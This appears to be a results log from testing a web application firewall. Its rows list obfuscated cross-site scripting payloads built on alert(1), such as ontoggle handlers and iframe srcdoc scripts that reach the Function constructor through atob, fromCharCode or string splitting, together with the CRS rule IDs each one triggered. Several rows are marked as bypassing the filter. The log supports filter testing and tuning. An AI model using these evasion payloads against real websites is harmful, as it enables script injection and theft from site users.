1440,"<details open ontoggle=Function(String.fromCharCode(97,108)+'ert(1)')()>",0,1,block,5,"934100,934100,941100,941120,949110","o32,19v217,72 || o32,19v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826675791.757509
1441,<details open ontoggle=Function('al'+'\x65rt(1)')()>,0,1,bypass,2,"941100,941120","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826675936.042249
1443,<details open ontoggle=window['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o29,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,18v217,59t:urlDecodeUni,t:compressWhitespace || ",20,177826676462.559649
1444,<details open ontoggle=top['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o26,29v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,15v217,56t:urlDecodeUni,t:compressWhitespace || ",20,177826676669.259461
1447,<details open ontoggle=Function('al'.concat('ert(1)'))()>,0,1,bypass,2,"941100,941120","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826677390.326713
1448,"<details open ontoggle=Function(['al','ert(1)'].join(''))()>",0,1,bypass,2,"941100,941120","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826677547.694831
1449,<details open ontoggle=Function(atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826677751.879148
1453,<details open ontoggle=new/**/Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826678655.874191
1455,<details open ontoggle=Function('ale'+'rt'+'(1)')()>,0,1,bypass,2,"941100,941120","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17782667904.363301
1456,<details open ontoggle=Function.prototype.constructor('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826679288.368016
1459,<details open ontoggle=window['Function']('ale'+'rt(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o29,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,18v217,59t:urlDecodeUni,t:compressWhitespace || ",20,177826679835.896697
1460,<details open ontoggle=self['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,16v217,57t:urlDecodeUni,t:compressWhitespace || ",20,177826680031.440187
1461,<details open ontoggle=parent['Function']('al'+'ert(1)')()>,0,1,block,4,"933210,941100,941120,949110","o29,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826680269.716685
1463,<details open ontoggle=globalThis.Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826680725.664940
1466,<details open ontoggle=(function(){})['constructor']('al'+'ert(1)')()>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o23,46v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,70 || o24,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826681344.065655
1469,"<details open ontoggle=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,4,"934100,941100,941120,949110","o32,19v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826682031.568128
1479,"<details open ontoggle=(0,Function)(atob('YWxlcnQoMSk='))()>",0,1,bypass,2,"941100,941120","v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826684152.178000
1489,"<details open ontoggle=(1,Function(atob('YWxlcnQoMSk=')))()>",0,1,bypass,2,"941100,941120","v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826686333.147549
1491,<details open ontoggle=globalThis['Function'](atob('YWxlcnQoMSk='))()>,0,1,block,4,"933210,941100,941120,949110","o33,36v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826686839.529688
1492,"<details open ontoggle=setTimeout(function(){Function(atob('YWxlcnQoMSk='))()},0)>",0,1,block,4,"934100,941100,941120,949110","o34,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826687018.534112
1502,"<details open ontoggle=setTimeout(function(){self[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,5,"934100,941100,941120,941370,949110","o34,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,41v217,141t:urlDecodeUni,t:compressWhitespace || ",20,177826689142.648863
1510,"<details open ontoggle=setTimeout(function(){(0,eval)(String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,5,"933210,934100,941100,941120,949110","o33,74v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826690840.896914
1520,"<iframe src=""data:text/html,<script>setTimeout(function(){(function(){}).constructor('al'+'ert(1)')()},0)</script>"">",0,1,block,10,"932100,933210,934100,934100,941100,941110,941130,941160,941170,949110","o55,12v217,116 || o46,59v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,116 || o47,11v217,116t:urlDecodeUni || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826693016.326962
1524,"<iframe src=""data:text/html,<script>setTimeout(function(){Reflect['construct'](Object['getPrototype'+'Of'](function(){})['constructo'+'r'],['al'+'ert(1)'])()},0)</script>"">",0,1,block,9,"933210,934100,934100,941100,941110,941130,941160,941170,949110","o46,115v217,172t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,172 || o47,11v217,172t:urlDecodeUni || v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826693985.981608
1552,"<iframe srcdoc=""<script>(new(self.Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,34v217,72t:urlDecodeUni,t:cmdLine || o24,37v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782670006.170390
1554,"<iframe srcdoc=""<script>(new/**/(Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,33v217,71t:urlDecodeUni,t:cmdLine || o24,33v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826700553.948779
1557,"<iframe srcdoc=""<script>new(Function)('a'+'lert(1)')()</script>"">",0,1,block,5,"933210,941100,941110,941160,949110","o27,27v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826701185.763865
1558,"<iframe srcdoc=""<script>(Function('a'+'lert(1)'))()</script>"">",0,1,block,5,"932130,941100,941110,941160,949110","o22,24v217,62t:urlDecodeUni,t:cmdLine || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826701363.542608
1559,"<iframe srcdoc=""<script>(Function.call(0,'a'+'lert(1)'))()</script>"">",0,1,block,5,"932130,941100,941110,941160,949110","o22,31v217,69t:urlDecodeUni,t:cmdLine || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826701686.658221
1561,"<iframe srcdoc=""<script>(new(self['Function'])('a'+'lert(1)'))()</script>"">",0,1,block,7,"932130,933210,941100,941110,941160,941370,949110","o22,35v217,75t:urlDecodeUni,t:cmdLine || o24,40v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,16v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826702048.661338
1562,"<iframe srcdoc=""<script>(self['Function']('a'+'lert(1)'))()</script>"">",0,1,block,7,"932130,933210,941100,941110,941160,941370,949110","o22,30v217,70t:urlDecodeUni,t:cmdLine || o24,35v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,16v217,70t:urlDecodeUni,t:compressWhitespace || ",30,177826702271.040389
1563,"<iframe srcdoc=""<script>(new(top.Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,33v217,71t:urlDecodeUni,t:cmdLine || o24,36v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826702413.552222
1564,"<iframe srcdoc=""<script>(new(parent.Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,36v217,74t:urlDecodeUni,t:cmdLine || o24,39v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826702641.379744
1565,"<iframe srcdoc=""<script>(new(window['Function'])('a'+'lert(1)'))()</script>"">",0,1,block,7,"932130,933210,941100,941110,941160,941370,949110","o22,37v217,77t:urlDecodeUni,t:cmdLine || o24,42v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,18v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826702980.339026
1568,"<iframe srcdoc=""<script>(new(Function)(['a','lert(1)'].join('')))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,38v217,78t:urlDecodeUni,t:cmdLine || o24,43v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826703543.922662
1652,"<iframe srcdoc=""<script>Function('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,69 || v217,69t:urlDecodeUni || ",25,177826721810.259100
1653,"<iframe srcdoc=""<script>[].constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,87 || v217,87t:urlDecodeUni || ",25,177826722066.200387
1655,"<iframe srcdoc=""<script>window['Function']('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"933210,941100,941110,941160,941370,949110","o30,29v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,79t:urlDecodeUni,t:compressWhitespace || ",25,177826722493.967270
1656,"<iframe srcdoc=""<script>self['Function']('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"933210,941100,941110,941160,941370,949110","o28,29v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177826722653.906328
1657,"<iframe srcdoc=""<script>(function(){this['ev'+'al']('ale'+'rt(1)')}).call(window)</script>""></iframe>",0,1,block,10,"932100,932130,933210,934100,934100,941100,941110,941160,941370,949110","o23,10v217,101 || o22,50v217,101t:urlDecodeUni,t:cmdLine || o24,57v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || o25,11v217,101t:urlDecodeUni || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,101t:urlDecodeUni,t:compressWhitespace || ",45,177826722994.292301
1658,"<iframe srcdoc=""<script>with(window)Function('ale'+'rt(1)')()</script>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826723144.959866
1659,"<iframe srcdoc=""<script>Reflect.construct(Function,['ale'+'rt(1)'])()</script>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826723313.193094
1666,"<iframe srcdoc=""<script>Array.constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,90 || v217,90t:urlDecodeUni || ",25,177826724841.372108
1667,"<iframe srcdoc=""<script>Object.constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,91 || v217,91t:urlDecodeUni || ",25,177826725054.199477
1668,"<iframe srcdoc=""<script>String.constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,91 || v217,91t:urlDecodeUni || ",25,177826725237.213927
1670,"<iframe srcdoc=""<script>({}).constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,5,"932130,941100,941110,941160,949110","o22,42v217,89t:urlDecodeUni,t:cmdLine || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782672566.931105
1714,"<iframe srcdoc=""<svg><script>top['Function']('','ale'+'rt(1)')()</script></svg>"">",0,1,block,6,"933210,941100,941110,941160,941370,949110","o32,32v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,15v217,81t:urlDecodeUni,t:compressWhitespace || ",25,17782673549.102952
1717,"<iframe srcdoc=""<svg><script>({})['__proto__']['constructor']['constructor']('ale'+'rt(1)')()</script></svg>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o27,55v217,110t:urlDecodeUni,t:cmdLine || o29,64v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826736059.273523
1720,"<iframe srcdoc=""<svg><script>Reflect.construct(''['constructor']['constructor'],['ale'+'rt(1)'])()</script></svg>"">",0,1,block,4,"941100,941110,941160,949110","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826736725.029379
1723,"<iframe srcdoc=""<svg><script>''['link']['constructor']('ale'+'rt(1)')()</script></svg>"">",0,1,block,5,"933210,941100,941110,941160,949110","o31,40v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826737377.401731
1724,"<iframe srcdoc=""<svg><script>Array.prototype['entries']['constructor']('ale'+'rt(1)')()</script></svg>"">",0,1,block,5,"933210,941100,941110,941160,949110","o44,43v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826737578.075950
